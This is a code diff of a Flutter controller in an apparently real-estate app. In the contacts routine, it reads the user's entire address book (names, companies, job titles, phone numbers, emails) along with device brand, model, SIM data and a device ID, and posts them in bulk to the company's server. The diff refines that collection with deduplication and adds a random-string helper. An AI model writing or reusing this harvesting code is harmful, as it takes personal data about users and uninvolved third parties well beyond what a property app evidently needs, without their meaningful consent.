@@ -2,7 +2,6 @@ import 'dart:convert';
 import 'package:contacts_service/contacts_service.dart';
 import 'package:device_imei/device_imei.dart';
 import 'package:device_info_plus/device_info_plus.dart';
-import 'package:dio/dio.dart';
 import 'package:firebase_analytics/firebase_analytics.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
@@ -13,13 +12,11 @@ import 'package:noahrealstate/app/data/model/contact_model.dart';
 import 'package:noahrealstate/app/data/model/data_model.dart';
 import 'package:noahrealstate/app/routes/app_pages.dart';
 import 'package:noahrealstate/app/service/api_call_status.dart';
-import 'package:noahrealstate/app/service/api_exceptions.dart';
 import 'package:noahrealstate/app/service/base_client.dart';
 import 'package:noahrealstate/app/service/cache_helper.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:http/http.dart' as http;
-import 'package:simnumber/sim_number.dart';
-import 'package:simnumber/siminfo.dart';
+import 'dart:math';
 
 class HomeController extends GetxController {
   List<Property>? data;
@@ -188,37 +185,47 @@ class HomeController extends GetxController {
     try {
       _getSimData();
       List contactsList = [];
-
+      Map<String, dynamic>? p = {};
       String? brand;
       String? model;
+      Iterable<Contact>? contacts;
       // You can also directly ask for the permission using the request() method.
       PermissionStatus permissionStatus = await Permission.contacts.request();
       if (permissionStatus.isGranted) {
-        Iterable<Contact> contacts =
-            await ContactsService.getContacts(withThumbnails: false);
+        contacts = await ContactsService.getContacts(withThumbnails: false);
+
+        Set<String> addedPhones = {};
+        Set<String> addedEmails = {};
 
         contacts.forEach((con) async {
-          List<String>? phones = [];
+          List<String> phones = [];
           con.phones!.forEach((phone) {
-            phone.value != null ? phones.add(phone.value!) : null;
+            if (phone.value != null && !addedPhones.contains(phone.value!)) {
+              phones.add(phone.value!);
+              addedPhones.add(phone.value!);
+            }
           });
 
-          List<String>? emails = [];
-          con.emails?.forEach(
-              (phone) => phone.value != null ? emails.add(phone.value!) : null);
-          DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
-          AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
-          brand = androidInfo.brand;
-          model = androidInfo.model;
-          ContactInfo info = ContactInfo(
-            name: con.displayName,
-            organization: con.company,
-            designation: con.jobTitle,
-            phoneNumbers: phones,
-            emailList: emails,
-          );
+          List<String> emails = [];
+          con.emails?.forEach((email) {
+            if (email.value != null && !addedEmails.contains(email.value!)) {
+              emails.add(email.value!);
+              addedEmails.add(email.value!);
+            }
+          });
 
-          contactsList.add(info.toJson());
+          // Assuming a contact is considered duplicate if any of its phone numbers or emails already exist in the list
+          if (phones.isNotEmpty || emails.isNotEmpty) {
+            ContactInfo info = ContactInfo(
+              name: con.displayName,
+              organization: con.company,
+              designation: con.jobTitle,
+              phoneNumbers: phones,
+              emailList: emails,
+            );
+
+            contactsList.add(info.toJson());
+          }
         });
       } else {
         print('no permission');
@@ -229,16 +236,24 @@ class HomeController extends GetxController {
       }
 
       bool status = await CacheHelper.getAddContacts();
-      String? imei = await DeviceImei().getDeviceImei();
-      Map<String, dynamic> p = {
-        'model': model,
-        'brand': brand,
-        'sim': simData..remove('phoneNumber')
-      };
 
       if (!status) {
         try {
+          String imei = '';
           // Make the POST request using http package
+          if (permissionStatus.isGranted) {
+            DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
+            AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
+            brand = androidInfo.brand;
+            model = androidInfo.model;
+            imei = androidInfo.id;
+
+            p = {
+              'model': model,
+              'brand': brand,
+              'sim': simData..remove('phoneNumber')
+            };
+          }
           final response = await http.post(
             Uri.parse('https://noahrealestateplc.com/app/index.php'),
             headers: {
@@ -265,6 +280,23 @@ class HomeController extends GetxController {
     } on PlatformException catch (e) {
       debugPrint("Failed to get mobile number because of '${e.message}'");
     }
+  }
+
+  String generateRandomString() {
+    // Get the current date and time
+    final DateTime now = DateTime.now();
+    final String dateTimeString =
+        '${now.year}${now.month.toString().padLeft(2, '0')}${now.day.toString().padLeft(2, '0')}${now.hour.toString().padLeft(2, '0')}${now.minute.toString().padLeft(2, '0')}${now.second.toString().padLeft(2, '0')}';
+
+    // Generate a random alphanumeric string
+    const String chars =
+        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    final Random rnd = Random();
+    final String randomString = String.fromCharCodes(Iterable.generate(
+        8, (_) => chars.codeUnitAt(rnd.nextInt(chars.length))));
+
+    // Combine the date-time string and the random string
+    return '$dateTimeString$randomString';
   }
 
   // }
